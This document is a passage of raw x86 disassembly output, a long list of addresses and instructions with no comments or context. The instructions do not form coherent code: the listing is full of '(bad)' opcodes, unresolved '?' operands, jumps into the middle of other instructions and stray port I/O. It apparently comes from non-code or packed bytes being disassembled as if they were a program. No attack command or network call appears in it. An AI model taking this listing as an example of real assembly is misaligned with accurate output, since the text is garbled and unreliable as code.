  413fa2:	xor    ah,cl
  413fa4:	push   es
  413fa5:	stos   DWORD PTR es:[edi],eax
  413fa6:	sub    BYTE PTR [ecx-0x70],bl
  413fa9:	inc    esi
  413faa:	mov    eax,0x74656910
  413faf:	adc    edx,DWORD PTR [ebx+0x59c114b]
  413fb5:	jp     0x413fc7
  413fb7:	mov    edi,0xbdb0091a
  413fbc:	xchg   DWORD PTR [esi-0x7b0fd29c],esi
  413fc2:	sub    edi,DWORD PTR [ecx]
  413fc4:	ror    BYTE PTR [edi],0xb0
  413fc7:	jmp    0x413ff2
  413fc9:	sub    esp,edi
  413fcb:	adc    eax,0xa560f839
  413fd0:	mov    ecx,esp
  413fd2:	mov    eax,ds:0xb448f877
  413fd7:	dec    edi
  413fd8:	nop
  413fd9:	add    eax,0x850bcee8
  413fde:	call   0x7f52:0x3053ef74
  413fe5:	cmp    BYTE PTR [edx+0x421e3d55],dh
  413feb:	(bad)  
  413fec:	daa    
  413fed:	ror    BYTE PTR [ecx-0x4a],0xa0
  413ff1:	leave  
  413ff2:	jp     0x413fb7
  413ff4:	call   0x3dfbd54d
  413ff9:	push   ds
  413ffa:	or     BYTE PTR [edx-0x3512ad09],0x70
  414001:	dec    edi
  414002:	mov    dl,0x84
  414004:	repz test al,0x4f
  414007:	ss mov ebx,0x330a78e8
  41400d:	push   eax
  41400e:	in     eax,0xd2
  414010:	add    eax,0x3ef9b834
  414015:	mov    ds:0x29072b45,eax
  41401a:	dec    eax
  41401b:	popf   
  41401c:	lahf   
  41401d:	mov    WORD PTR [edi+0x29],?
  414020:	push   es
  414021:	sbb    eax,0x39f72bf0
  414026:	xchg   ecx,eax
  414027:	mov    WORD PTR [ecx],ds
  414029:	les    ebp,FWORD PTR [edi+0xcc01630]
  41402f:	dec    edx
  414030:	in     al,0x6e
  414032:	pop    DWORD PTR [edx]
  414034:	imul   esp,DWORD PTR [edi],0x78
  414037:	and    cl,dl
  414039:	nop
  41403a:	daa    
  41403b:	xlat   BYTE PTR ds:[ebx]
  41403c:	jb     0x414099
  41403e:	mov    ds:0x1713719b,al
  414043:	(bad)  
  414044:	or     dh,dl
  414046:	cmc    
  414047:	jl     0x41408e
  414049:	repnz ficomp WORD PTR fs:[ecx]
  41404d:	pop    esp
  41404e:	xlat   BYTE PTR ds:[ebx]
  41404f:	ret    0x1633
  414052:	and    eax,0x222c3ca
  414057:	dec    esp
  414058:	loopne 0x41409f
  41405a:	add    al,0xf5
  41405c:	lahf   
  41405d:	mov    DWORD PTR [bp+0x4e],eax
  414061:	scas   eax,DWORD PTR es:[edi]
  414062:	jno    0x4140ad
  414064:	popa   
  414065:	pop    edi
  414066:	test   DWORD PTR [edi+eiz*2-0x5f678d71],edx
  41406d:	test   eax,0x8f280ccb
  414072:	sbb    eax,0x76c48d5
  414077:	dec    esi
  414078:	mov    ebp,DWORD PTR [edx]
  41407a:	sbb    ebx,DWORD PTR [edx+ebp*8-0x63]
  41407e:	pushf  
  41407f:	adc    dl,BYTE PTR [edi]
  414081:	rcl    DWORD PTR [edi],1
  414083:	dec    cl
  414085:	daa    
  414086:	or     dh,BYTE PTR [edi+0x4e]
  414089:	inc    edx
  41408a:	mov    ds:0x3797187b,eax
  41408f:	call   0xe63f:0xf80d28fb
  414096:	sbb    al,0xec
  414098:	adc    eax,0xd6dc31a2
  41409d:	das    
  41409e:	(bad)  
  41409f:	(bad)  
  4140a0:	nop
  4140a1:	pop    edx
  4140a2:	mov    dh,0x60
  4140a4:	adc    al,0x51
  4140a6:	sub    eax,DWORD PTR ss:[edx-0x70]
  4140aa:	arpl   WORD PTR [esp+eiz*4-0x7ca996c],sp
  4140b1:	jge    0x41403c
  4140b3:	cs and ebp,ebp
  4140b6:	add    eax,esp
  4140b8:	mov    cl,0xf7
  4140ba:	push   ebx
  4140bb:	sbb    ecx,DWORD PTR ds:0xdb9d32ff
  4140c1:	cmp    eax,0xf5309095
  4140c6:	dec    edx
  4140c7:	ficom  WORD PTR [eax+0x7b1386cb]
  4140cd:	lods   al,BYTE PTR ds:[esi]
  4140ce:	xchg   edi,eax
  4140cf:	fwait
  4140d0:	xor    cl,BYTE PTR [edx+0x214cdb9d]
  4140d6:	dec    edx
  4140d7:	icebp  
  4140d8:	sub    eax,0x74cbb2af
  4140dd:	gs popa 
  4140df:	and    eax,0xb860c1e1
  4140e4:	push   esi
  4140e5:	mov    ebx,0x41817fd3
  4140ea:	arpl   WORD PTR [eax-0x27],bp
  4140ed:	lea    edi,[eax+0x6f]
  4140f0:	pop    ebx
  4140f1:	inc    esi
  4140f2:	jnp    0x414160
  4140f4:	mov    al,ds:0x4e470be3
  4140f9:	popf   
  4140fa:	dec    edi
  4140fb:	xchg   esp,eax
  4140fc:	fbstp  TBYTE PTR [ebp+esi*2-0x40]
  414100:	inc    eax
  414101:	mov    WORD PTR es:[edx+ebx*8+0x691a00b8],ds
  414109:	or     BYTE PTR [ecx],dl
  41410b:	sar    ah,1
  41410d:	test   eax,0x3c9debda
  414112:	repnz retf 0xe375
  414116:	and    eax,ebp
  414118:	jmp    0xe32e6daa
  41411d:	inc    eax
  41411e:	(bad)  
  41411f:	push   0xffffff8f
  414121:	fadd   QWORD PTR [eax+0x1507db36]
  414127:	lds    ebp,FWORD PTR [ecx+0x56893327]
  41412d:	inc    eax
  41412e:	pop    ds
  41412f:	xchg   BYTE PTR [edx-0x7a13edf9],ch
  414135:	push   ds
  414136:	dec    esp
  414137:	dec    eax
  414138:	fsub   QWORD PTR [edi]
  41413a:	jl     0x414181
  41413c:	mov    ebp,0x3aa661de
  414141:	adc    eax,0x41b221f3
  414146:	outs   dx,DWORD PTR ds:[esi]
  414147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414148:	pusha  
  414149:	lock jbe 0x4141bc
  41414c:	push   cs
  41414d:	xchg   DWORD PTR [esi-0x48],esp
  414150:	jne    0x414172
  414152:	jecxz  0x4140d9
  414154:	fld    DWORD PTR [eax-0x160eee5]
  41415a:	sbb    BYTE PTR [eax-0x20],ah
  41415d:	jbe    0x4140ed
  41415f:	call   0x23981f2e
  414164:	or     cl,ah
  414166:	inc    esp
  414167:	mov    bl,0xa3
  414169:	jbe    0x41417d
  41416b:	stc    
  41416c:	push   ebx
  41416d:	aam    0x58
  41416f:	fld    DWORD PTR [edi+ecx*1]
  414172:	sub    bh,BYTE PTR [edi+0x5cb8cad0]
  414178:	into   
  414179:	mov    ?,WORD PTR [edi-0x15]
  41417c:	js     0x41419d
  41417e:	xor    dh,ah
  414180:	retf   
  414181:	js     0x4141f4
  414183:	cld    
  414184:	ins    BYTE PTR es:[edi],dx
  414185:	out    0xbb,eax
  414187:	inc    esp
  414188:	bound  edx,QWORD PTR [eax+0x72]
  41418b:	inc    ebx
  41418c:	adc    dh,al
  41418e:	jns    0x4141c1
  414190:	out    dx,al
  414191:	cmp    DWORD PTR [esi-0x37],ecx
  414194:	sbb    al,0xa5
  414196:	add    BYTE PTR ds:[ebp+0x26f69433],ch
  41419d:	out    dx,eax
  41419e:	mov    WORD PTR [ecx+edi*2],gs
  4141a1:	fwait
  4141a2:	jae    0x4141a2
  4141a4:	xor    dh,BYTE PTR [ebx-0x2362ba69]
  4141aa:	out    dx,eax
  4141ab:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4141ad:	sub    eax,0x69f5039a
  4141b2:	add    al,0xfe
  4141b4:	loopne 0x414210
  4141b6:	jne    0x414217
  4141b8:	(bad)  [edi+0x4e]
  4141bb:	data16 ja 0x414141
  4141be:	sub    DWORD PTR [esi+eax*8-0x2c],esi
  4141c2:	int    0x93
  4141c4:	stos   DWORD PTR es:[edi],eax
  4141c5:	pop    ebx
  4141c6:	sbb    DWORD PTR gs:[edx+0x2c],0xb1dad54b
  4141ce:	cmp    al,0x79
  4141d0:	aaa    
  4141d1:	cs push edx
  4141d3:	in     al,dx
  4141d4:	aas    
  4141d5:	jg     0x4141fb
  4141d7:	leave  
  4141d8:	ficomp DWORD PTR ds:0xc5c86261
  4141de:	mov    edi,0xd1531b68
  4141e3:	adc    bl,BYTE PTR [ebp-0x6e9af7ff]
  4141e9:	ds scas al,BYTE PTR es:[edi]
  4141eb:	inc    eax
  4141ec:	arpl   WORD PTR [ebp-0x3cee15df],ax
  4141f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141f3:	jmp    0xa2e:0x2da55d15
  4141fa:	mov    ecx,0xddf2cba4
  4141ff:	lods   al,BYTE PTR ds:[esi]
  414200:	ret    
  414201:	jno    0x41418a
  414203:	adc    eax,0x1c49e6b9
  414208:	sbb    esp,DWORD PTR [esi+0x1c21969a]
  41420e:	rcl    DWORD PTR [edx+esi*2],1
  414211:	mov    edi,0xdd310eb0
  414216:	xor    bl,ah
  414218:	jns    0x414279
  41421a:	nop
  41421b:	popf   
  41421c:	xor    al,0x7c
  41421e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41421f:	sub    DWORD PTR [ebp-0x5d0bd44c],0x20
  414226:	and    eax,0xdcb9d7af
  41422b:	sti    
  41422c:	cs cwde 
  41422e:	mov    ch,cl
  414230:	fcmovbe st,st(2)
  414232:	xchg   ebp,eax
  414233:	xchg   dh,dh
  414235:	cmp    al,0xc7
  414237:	int    0x35
  414239:	sub    BYTE PTR [ebp+ebp*1+0x16],bl
  41423d:	jae    0x4142ae
  41423f:	inc    edx
  414240:	mov    fs,WORD PTR [ecx+0x7bda10c1]
  414246:	rcl    bh,cl
  414248:	xor    DWORD PTR [edx+0x10],esi
  41424b:	popa   
  41424c:	call   0x536b12c3
  414251:	xor    bl,BYTE PTR [ebx]
  414253:	fsubr  DWORD PTR [edx+0x183b8772]
  414259:	mov    DWORD PTR [ebx+0x1b9f1f71],ecx
  41425f:	and    DWORD PTR [esi+eax*4],edx
  414262:	aam    0x23
  414264:	sub    bh,BYTE PTR [edi]
  414266:	sub    BYTE PTR [edx-0x562193d2],bh
  41426c:	and    ah,BYTE PTR [edx-0x1186a3b8]
  414272:	sar    BYTE PTR [edx-0x291ba635],cl
  414278:	shl    ah,0xb2
  41427b:	sti    
  41427c:	sar    BYTE PTR [ebx-0x28],cl
  41427f:	and    dh,0x26
  414282:	push   ebx
  414283:	mov    dh,BYTE PTR [ebp+0x122aa633]
  414289:	(bad)  
  41428a:	fild   DWORD PTR [ebp+0x56]
  41428d:	jmp    0x4142e0
  41428f:	add    DWORD PTR [esi+eax*4-0x3c629f3],edi
  414296:	xchg   ebx,eax
  414297:	pop    esp
  414298:	das    
  414299:	leave  
  41429a:	in     eax,dx
  41429b:	pop    ds
  41429c:	pop    edi
  41429d:	inc    esi
  41429e:	lods   al,BYTE PTR ds:[esi]
  41429f:	lahf   
  4142a0:	std    
  4142a1:	dec    ebp
  4142a2:	scas   eax,DWORD PTR es:[edi]
  4142a3:	(bad)  
  4142a4:	cwde   
  4142a5:	mov    DWORD PTR [edx+0x6a],ebp
  4142a8:	sahf   
  4142a9:	jecxz  0x41427d
  4142ab:	dec    esp
  4142ac:	test   eax,0xd2708c82
  4142b1:	ret    0xebaf
  4142b4:	xor    cl,BYTE PTR [edx+0x2c]
  4142b7:	aad    0x7d
  4142b9:	push   ecx
  4142ba:	jle    0x414294
  4142bc:	fistp  DWORD PTR [ebp+0x47cecffd]
  4142c2:	std    
  4142c3:	jg     0x414264
  4142c5:	sbb    eax,0x82449ba9
  4142ca:	in     eax,0xc4
  4142cc:	fstp   QWORD PTR [ecx-0x2f23195b]
  4142d2:	loop   0x414268
  4142d4:	jl     0x414271
  4142d6:	xchg   edx,eax
  4142d7:	pop    eax
  4142d8:	fstp   st(3)
  4142da:	adc    DWORD PTR [edx-0x6e],eax
  4142dd:	and    dh,0x2a
  4142e0:	fcmovu st,st(2)
  4142e2:	mov    esi,0x464e4748
  4142e7:	ret    0x4e5d
  4142ea:	pop    esp
  4142eb:	push   cs
  4142ec:	lock push eax
  4142ee:	mov    ch,0xdd
  4142f0:	(bad)  
  4142f1:	arpl   WORD PTR [eax+eiz*8-0xfe9535b],dx
  4142f8:	jl     0x4142fa
  4142fa:	fs mov esi,0x103116e5
  414300:	cmp    ch,BYTE PTR [edi-0x3d868fd9]
  414306:	imul   ebp,esp,0xf3edc349
  41430c:	dec    esi
  41430d:	ss in  al,dx
  41430f:	popa   
  414310:	cdq    
  414311:	pop    edi
  414312:	call   0xbbe775e8
  414317:	scas   eax,DWORD PTR es:[edi]
  414318:	out    0x6c,al
  41431a:	push   ss
  41431b:	loop   0x41434d
  41431d:	mov    al,ds:0x724e16fb
  414322:	adc    DWORD PTR [eax+edx*2],0xa55acd1e
  414329:	and    esp,ebx
  41432b:	jne    0x4142fa
  41432d:	adc    eax,0x5ecdb003
  414332:	add    BYTE PTR [edx-0x10],dl
  414335:	jno    0x41430f
  414337:	sbb    bl,BYTE PTR [esi]
  414339:	xor    bh,BYTE PTR ds:0xe3942ead
  41433f:	add    DWORD PTR [edi],0xffffffa5
  414342:	ret    0xab8
  414345:	jecxz  0x414331
  414347:	shl    esi,cl
  414349:	push   ss
  41434a:	inc    esi
  41434b:	jl     0x414310
  41434d:	add    edx,DWORD PTR [ebp+ebx*1+0x401167a8]
  414354:	cli    
  414355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414356:	in     eax,dx
  414357:	aaa    
  414358:	fndisi(8087 only) 
  41435a:	clc    
  41435b:	sbb    eax,DWORD PTR [edi]
  41435d:	loopne 0x414347
  41435f:	int3   
  414360:	mov    fs,WORD PTR [ecx+0x42]
  414363:	ins    BYTE PTR es:[edi],dx
  414364:	sub    ecx,DWORD PTR ds:0xa57c8464
  41436a:	push   ebx
  41436b:	or     bh,dl
  41436d:	add    DWORD PTR [edi+0x56],0x20
  414371:	das    
  414372:	pop    ebx
  414373:	test   BYTE PTR [esi+eax*4],bh
  414376:	adc    eax,0xf07893c5
  41437b:	gs jp  0x4143f3
  41437e:	lahf   
  41437f:	js     0x4143da
  414381:	(bad)  
  414382:	out    dx,al
  414383:	sbb    DWORD PTR [edx+0x7f],edx
  414386:	stc    
  414387:	jecxz  0x414391
  414389:	adc    BYTE PTR [eax],dh
  41438b:	mov    edx,0xb06e9d79
  414390:	and    BYTE PTR [edi+0x40],bl
  414393:	das    
  414394:	sbb    al,0xc4
  414396:	repnz fidivr DWORD PTR [esi-0x534c3c40]
  41439d:	mov    bh,0xc6
  41439f:	pop    eax
  4143a0:	xor    ebp,DWORD PTR [esi]
  4143a2:	cld    
  4143a3:	mov    al,0xd3
  4143a5:	and    BYTE PTR [ebp+0x5edf8691],ah
  4143ab:	cwde   
  4143ac:	cmp    eax,0x40b85237
  4143b1:	sbb    esp,DWORD PTR [edx+ebp*4-0x73]
  4143b5:	lds    edi,FWORD PTR [edx]
  4143b7:	bound  ebx,QWORD PTR [esi]
  4143b9:	adc    edx,eax
  4143bb:	xchg   ebx,eax
  4143bc:	add    eax,0xc9b4bb48
  4143c1:	outs   dx,BYTE PTR ds:[esi]
  4143c2:	push   0xffffffb4
  4143c4:	jmp    0x4143db
  4143c6:	popf   
  4143c7:	repz test BYTE PTR ss:[eax-0x3dba60ea],dl
  4143cf:	dec    esi
  4143d0:	fstp   DWORD PTR [ecx-0x75]
  4143d3:	adc    DWORD PTR [ecx-0x6],ebx
  4143d6:	push   ebx
  4143d7:	sbb    esi,DWORD PTR [edx+0x6e]
  4143da:	aad    0xf1
  4143dc:	jp     0x4143a7
  4143de:	pushf  
  4143df:	sahf   
  4143e0:	jmp    0xa86218a9
  4143e5:	cmp    edx,DWORD PTR [edi]
  4143e7:	into   
  4143e8:	push   ecx
  4143e9:	pop    edx
  4143ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143eb:	repz jge 0x414424
  4143ee:	sti    
  4143ef:	pop    ebp
  4143f0:	sub    BYTE PTR [eax-0x32],0x17
  4143f4:	pop    eax
  4143f5:	pushf  
  4143f6:	jl     0x41438d
  4143f8:	cli    
  4143f9:	(bad)  
  4143fa:	pop    ss
  4143fb:	xor    eax,0xd45e601e
  414400:	shr    DWORD PTR [ebp-0x2e],0x77
  414404:	push   ebx
  414405:	jno    0x4143af
  414407:	cld    
  414408:	add    al,0x4b
  41440a:	sub    dl,BYTE PTR [ecx-0x1235231]
  414410:	push   ss
  414411:	pop    ecx
  414412:	imul   eax,DWORD PTR [esi+0xe],0xbddfd3a7
  414419:	or     al,bh
  41441b:	sbb    BYTE PTR [eiz*1-0x15c5c66d],al
  414422:	stos   BYTE PTR es:[edi],al
  414423:	jb     0x414420
  414425:	inc    eax
  414426:	es push es
  414428:	nop
  414429:	scas   eax,DWORD PTR es:[edi]
  41442a:	pop    edi
  41442b:	mov    ch,0xd2
  41442d:	pop    ss
  41442e:	add    DWORD PTR [eax+ebp*2+0x12],0x7770cd41
  414436:	cmp    BYTE PTR [ecx-0x1d94aea3],bl
  41443c:	xchg   esp,eax
  41443d:	inc    esi
  41443e:	mov    ebp,?
  414440:	sbb    BYTE PTR [edi-0x27054295],cl
  414446:	xchg   dh,dl
  414448:	push   eax
  414449:	cmp    al,0x7c
  41444b:	mov    ds:0x98500558,eax
  414450:	xor    DWORD PTR [ebp-0x6f1dd094],edi
  414456:	adc    eax,ebx
  414458:	jne    0x414477
  41445a:	xchg   esp,eax
  41445b:	mov    eax,0xcd7e4025
  414460:	push   ecx
  414461:	xor    edi,edx
  414463:	out    0x12,al
  414465:	mov    esp,0x806dc638
  41446a:	xchg   edi,eax
  41446b:	(bad)  
  41446c:	jnp    0x4144bf
  41446e:	mov    ebx,0xd41d5ae1
  414473:	xor    eax,0xb6677087
  414478:	mov    eax,ds:0x6b83bb46
  41447d:	js     0x4144b4
  41447f:	shl    eax,cl
  414481:	adc    BYTE PTR [ebp-0x28ff1b8f],dl
  414487:	or     DWORD PTR [ecx],ecx
  414489:	fucom  st(3)
  41448b:	es js  0x4144c9
  41448e:	es in  al,0x15
  414491:	es mov esp,0x4487477
  414497:	inc    ebx
  414498:	add    edx,DWORD PTR [ecx]
  41449a:	lahf   
  41449b:	sub    al,dh
  41449d:	add    eax,0x78367ca0
  4144a2:	scas   eax,DWORD PTR es:[edi]
  4144a3:	mov    ds:0xcc916e33,al
  4144a8:	jne    0x41442f
  4144aa:	fwait
  4144ab:	pop    eax
  4144ac:	xchg   BYTE PTR [edx-0x4c],ch
  4144af:	mov    ah,0xc8
  4144b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b2:	cmp    ch,BYTE PTR [ebx]
  4144b4:	mov    eax,DWORD PTR [edi-0x7036d632]
  4144ba:	sbb    ah,dl
  4144bc:	imul   ebp,esp,0x5db6d3eb
  4144c2:	xor    edx,DWORD PTR [edi-0x45]
  4144c5:	(bad)  
  4144c6:	cdq    
  4144c7:	jbe    0x4144a9
  4144c9:	jle    0x414543
  4144cb:	aas    
  4144cc:	mov    cl,0xce
  4144ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144cf:	inc    ebp
  4144d0:	or     eax,0x10c69ba7
  4144d5:	add    al,0xb1
  4144d7:	pop    esp
  4144d8:	stos   DWORD PTR es:[edi],eax
  4144d9:	mov    ds:0x6c1dea3d,eax
  4144de:	xor    al,0xe3
  4144e0:	mov    al,ds:0x54eda14
  4144e5:	pop    es
  4144e6:	xchg   edi,eax
  4144e7:	mov    al,0xab
  4144e9:	(bad)  
  4144ea:	jo     0x414515
  4144ec:	jecxz  0x4144ce
  4144ee:	or     BYTE PTR [eax],ah
  4144f0:	mov    al,ds:0x37d4ca97
  4144f5:	jo     0x4144c0
  4144f7:	lds    eax,FWORD PTR [ebp+0x47f35716]
  4144fd:	or     eax,0x83d6bb9b
  414502:	jmp    0xf7de:0xc539b7ca
  414509:	shld   ebx,ebx,cl
  41450c:	add    eax,0xbd47468f
  414511:	mov    ebx,eax
  414513:	jmp    FWORD PTR [ebx-0x1b]
  414516:	pop    ecx
  414518:	jnp    0x4144d6
  41451a:	pop    esi
  41451b:	dec    ebx
  41451c:	popa   
  41451d:	ficom  WORD PTR [edx]
  41451f:	dec    esp
  414520:	push   eax
  414521:	sub    esi,DWORD PTR [eax-0x7a237843]
  414527:	test   eax,0x10fef0d5
  41452c:	xchg   esi,eax
  41452d:	inc    edx
  41452e:	scas   al,BYTE PTR es:[edi]
  41452f:	(bad)  
  414531:	jl     0x41450f
  414533:	cmp    edx,DWORD PTR [eax-0xdc1e5ac]
  414539:	jg     0x414518
  41453b:	dec    esi
  41453c:	add    eax,0x49493fb4
  414541:	pop    ebp
  414542:	sub    BYTE PTR [ebp+0x7e400d32],dh
  414548:	push   0xa666023a
  41454d:	fucom  st(2)
  41454f:	lods   eax,DWORD PTR ds:[esi]
  414550:	and    eax,0xfefebbbe
  414555:	dec    ebx
  414556:	lods   eax,DWORD PTR ds:[esi]
  414557:	cmp    al,BYTE PTR [esp+ecx*8]
  41455a:	xchg   edi,eax
  41455b:	repnz (bad) 
  41455d:	xchg   edx,eax
  41455e:	or     DWORD PTR [ebx+0x53f2c442],edi
  414564:	pop    ebx
  414565:	cwde   
  414566:	iret   
  414567:	adc    al,BYTE PTR [esi-0x62]
  41456a:	sbb    eax,0x58ae2abb
  41456f:	adc    al,0x9c
  414571:	xor    BYTE PTR [edx+0x2e],ch
  414574:	icebp  
  414575:	sti    
  414576:	mov    ebx,0xbd6899a9
  41457b:	pop    es
  41457c:	jg     0x4145f4
  41457e:	mov    eax,ds:0x37f1d04c
  414583:	jmp    0x873b:0x7315a6d6
  41458a:	mov    esp,0xd8cf9829
  41458f:	jbe    0x414521
  414591:	inc    ebp
  414592:	sbb    ch,dl
  414594:	or     DWORD PTR [edi-0x4b],0x996b338c
  41459b:	sub    dh,BYTE PTR [ecx]
  41459d:	and    BYTE PTR [edx+0x3e],cl
  4145a0:	pushf  
  4145a1:	sahf   
  4145a2:	shr    DWORD PTR [esp+ecx*8],0x6c
  4145a6:	sbb    ch,BYTE PTR [esi]
  4145a8:	ja     0x41459c
  4145aa:	imul   ecx,DWORD PTR [eax+0x4a562387],0x72
  4145b1:	jl     0x414599
  4145b3:	or     eax,0x50294a95
  4145b8:	push   ebp
  4145b9:	les    ecx,FWORD PTR [ebp-0x21]
  4145bc:	(bad)  
  4145bd:	mov    bh,0x19
  4145bf:	jmp    0x414613
  4145c1:	loop   0x41458e
  4145c3:	push   ecx
  4145c4:	les    edi,FWORD PTR [ecx-0x2]
  4145c7:	jmp    0x4145cf
  4145c9:	imul   edx,DWORD PTR [ebx+0x22],0x4a
  4145cd:	dec    ebp
  4145ce:	mov    bh,0xfe
  4145d0:	in     al,0x76
  4145d2:	push   edi
  4145d3:	cli    
  4145d4:	aaa    
  4145d5:	adc    al,0xae
  4145d7:	mov    DWORD PTR [esi+0x35e15171],ebx
  4145dd:	(bad)  
  4145de:	sbb    al,0x94
  4145e0:	hlt    
  4145e1:	shl    DWORD PTR [ebx+0x2],cl
  4145e4:	or     ebx,DWORD PTR [esi-0x33b00658]
  4145ea:	mov    edi,0x5ec5dbdd
  4145ef:	xor    eax,0xb7620f00
  4145f4:	jmp    0x414645
  4145f6:	(bad)  
  4145f7:	aas    
  4145f8:	inc    edx
  4145f9:	loop   0x4145b8
  4145fb:	dec    ebx
  4145fc:	repz sar BYTE PTR [ecx+esi*2-0x30],0x91
  414602:	sub    DWORD PTR ds:0x4306be76,esi
  414608:	cwde   
  414609:	mov    ebp,DWORD PTR [ebx+0x35]
  41460c:	loope  0x414621
  41460e:	out    dx,eax
  41460f:	bound  ebx,QWORD PTR [ebx-0x7350f305]
  414615:	js     0x4145fa
  414617:	sbb    dh,dl
  414619:	inc    ecx
  41461a:	das    
  41461b:	cmp    dh,BYTE PTR [eax+0x58]
  41461e:	mov    al,0xd2
  414620:	aad    0xbe
  414622:	adc    ebx,eax
  414624:	xchg   ah,al
  414626:	cwde   
  414627:	jmp    0xa1358f14
  41462c:	(bad)  
  41462d:	mov    bl,0xa0
  41462f:	xor    eax,0x4020bd32
  414634:	push   ss
  414635:	sbb    eax,DWORD PTR [ebp-0x29f27ced]
  41463b:	sub    al,0x3e
  41463d:	push   0xbbc7aebe
  414642:	mov    al,0x88
  414644:	xlat   BYTE PTR ds:[ebx]
  414645:	js     0x41462b
  414647:	fstp   st(7)
  414649:	jbe    0x414677
  41464b:	fidiv  DWORD PTR [edx]
  41464d:	jne    0x41460a
  41464f:	std    
  414650:	inc    ebx
  414651:	sbb    dh,ah
  414653:	xor    BYTE PTR [ebx-0x37],0x6d
  414657:	mov    edx,0xfe510077
  41465c:	mov    ch,0x8d
  41465e:	jae    0x414656
  414660:	pop    ecx
  414661:	sbb    bl,BYTE PTR [eax+ebp*1+0x74c2235a]
  414668:	push   es
  414669:	mov    edx,0x8cb7bbd5
  41466e:	pop    eax
  41466f:	push   ss
  414670:	jl     0x41460b
  414672:	std    
  414673:	and    al,0x30
  414675:	ret    0x67a0
  414678:	test   al,0xed
  41467a:	fwait
  41467b:	inc    eax
  41467c:	fist   DWORD PTR [esi+0x34]
  41467f:	mov    edx,0x532f494a
  414684:	ror    BYTE PTR [ebp-0x79ae567f],1
  41468a:	aad    0xaa
  41468c:	pop    es
  41468d:	cmp    ebx,DWORD PTR [esi-0x7fd3008c]
  414693:	fistp  DWORD PTR [eax]
  414695:	fucomip st,st(2)
  414697:	inc    esp
  414698:	hlt    
  414699:	pop    ds
  41469a:	fidivr WORD PTR [edx-0x4759f05e]
  4146a0:	test   DWORD PTR ss:[ebx-0x58595a92],0x4f28a195
  4146ab:	sbb    al,0x2b
  4146ad:	add    DWORD PTR [edx+ecx*8],esi
  4146b0:	push   cs
  4146b1:	inc    edi
  4146b2:	sar    DWORD PTR [edx-0x56a54f5d],0x43
  4146b9:	xor    bl,bh
  4146bb:	cli    
  4146bc:	cmp    esi,DWORD PTR [esi+edx*8+0x7f183c4f]
  4146c3:	xchg   ecx,eax
  4146c4:	push   cs
  4146c5:	pushf  
  4146c6:	xor    al,0x1a
  4146c8:	jl     0x41471b
  4146ca:	lods   al,BYTE PTR ds:[esi]
  4146cb:	or     BYTE PTR [edx-0x32d55ba3],cl
  4146d1:	sub    BYTE PTR [eax],bh
  4146d3:	sub    DWORD PTR ds:0x134ecbf9,ebp
  4146d9:	addr16 cli 
  4146db:	cmp    DWORD PTR [ebx-0x37d1d027],esi
  4146e1:	cdq    
  4146e2:	add    BYTE PTR [eiz*2-0x6aafc93b],dh
  4146e9:	xchg   ecx,eax
  4146ea:	pop    ss
  4146eb:	in     al,0xe4
  4146ed:	cmc    
  4146ee:	sbb    DWORD PTR [ecx-0x4d0cf36d],ebx
  4146f4:	inc    esi
  4146f5:	aam    0x78
  4146f7:	jmp    0x74ff:0xff40ed67
  4146fe:	ret    
  4146ff:	inc    esp
  414700:	jnp    0x41476f
  414702:	ret    
  414703:	sub    ah,dh
  414705:	jne    0x4146bb
  414707:	push   eax
  414708:	dec    ebp
  414709:	cmc    
  41470a:	adc    eax,0x15e7471f
  41470f:	aad    0xb4
  414711:	ins    DWORD PTR es:[edi],dx
  414712:	xchg   ebp,eax
  414713:	xor    DWORD PTR [edx+0x1e1f9fa6],0xffffffe4
  41471a:	sbb    cl,BYTE PTR [esi-0x6c332a7]
  414720:	push   es
  414721:	add    eax,DWORD PTR [ebx-0x70]
  414724:	fdivr  DWORD PTR [eax-0x75]
  414727:	int3   
  414728:	clc    
  414729:	bound  esp,QWORD PTR [edx+0x1a]
  41472c:	push   es
  41472d:	and    BYTE PTR ds:0x21bda285,dl
  414733:	das    
  414734:	xchg   edi,eax
  414735:	fs mov ebx,0x11a90ad7
  41473b:	or     dl,dl
  41473d:	mov    ds:0x10269dff,al
  414742:	adc    eax,0xeaa27fd1
  414747:	dec    edi
  414748:	and    edx,ebp
  41474a:	dec    esp
  41474b:	ret    
  41474c:	sub    eax,0xb81861b9
  414751:	lahf   
  414752:	mov    esp,0xf463b5d0
  414757:	sub    ah,BYTE PTR [ebp+0x4441d3aa]
  41475d:	push   esp
  41475e:	cs jno 0x414724
  414761:	hlt    
  414762:	sahf   
  414763:	repz or eax,0xb3c1cdfd
  414769:	das    
  41476a:	test   DWORD PTR [ebx+0x32],edx
  41476d:	xchg   ebx,eax
  41476e:	mov    edx,DWORD PTR [esi+eiz*1+0x49]
  414772:	jl     0x4147ac
  414774:	popa   
  414775:	jmp    0x1e88b060
  41477a:	pop    es
  41477b:	inc    esp
  41477c:	xchg   cl,ch
  41477e:	pop    es
  41477f:	or     dh,0x37
  414782:	cmp    DWORD PTR [ecx-0x11],esi
  414785:	scas   eax,DWORD PTR es:[edi]
  414786:	sub    ebx,DWORD PTR [ebp+ebx*8+0x546fd022]
  41478d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41478e:	in     al,dx
  41478f:	ins    DWORD PTR es:[edi],dx
  414790:	mov    edi,0xb432a9bf
  414795:	sub    eax,0x82c6dbb5
  41479a:	jb     0x414766
  41479c:	jns    0x4147bb
  41479e:	fwait
  41479f:	sub    eax,0x1b9e4098
  4147a4:	shl    BYTE PTR [esi],0xb0
  4147a7:	aas    
  4147a8:	jbe    0x41477a
  4147aa:	xor    ebx,DWORD PTR [edi]
  4147ac:	repz mov ecx,0x1b7ac408
  4147b2:	cdq    
  4147b3:	and    ebx,edx
  4147b5:	adc    DWORD PTR [ebx+0x1e0240a4],edx
  4147bb:	dec    eax
  4147bc:	add    ebp,DWORD PTR [ebp+0x79]
  4147bf:	cwde   
  4147c0:	jbe    0x41478a
  4147c2:	dec    ebx
  4147c3:	xor    bl,BYTE PTR [esi-0x41]
  4147c6:	adc    dl,BYTE PTR [edi+0x15]
  4147c9:	add    eax,0x6c1a5149
  4147ce:	fnsave [ebx-0x38ff8bbe]
  4147d4:	(bad)  
